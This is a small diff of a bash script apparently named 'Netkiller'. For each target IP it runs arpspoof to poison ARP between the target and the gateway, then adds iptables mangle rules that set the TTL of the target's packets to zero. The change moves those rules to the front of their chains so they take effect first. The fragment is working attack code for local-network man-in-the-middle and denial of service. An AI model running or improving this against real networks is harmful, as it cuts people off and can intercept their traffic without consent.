@@ -234,8 +234,8 @@ for TARGET in "${TARGETS[@]}"; do
      echo "Netkiller kill the target IP: $TARGET"
    ( arpspoof -i "$INTERFACE" -t "$TARGET" -r "$GATEWAY" >/dev/null 2>&1 ) &
      PIDS+=($!)
-     iptables -t mangle -A FORWARD -s "$TARGET" -j TTL --ttl-set 0
-     iptables -t mangle -A PREROUTING -s "$TARGET" -j TTL --ttl-set 0
+     iptables -t mangle -I FORWARD 1 -s "$TARGET" -j TTL --ttl-set 0
+     iptables -t mangle -I PREROUTING 1 -s "$TARGET" -j TTL --ttl-set 0
 done
 
 echo " "
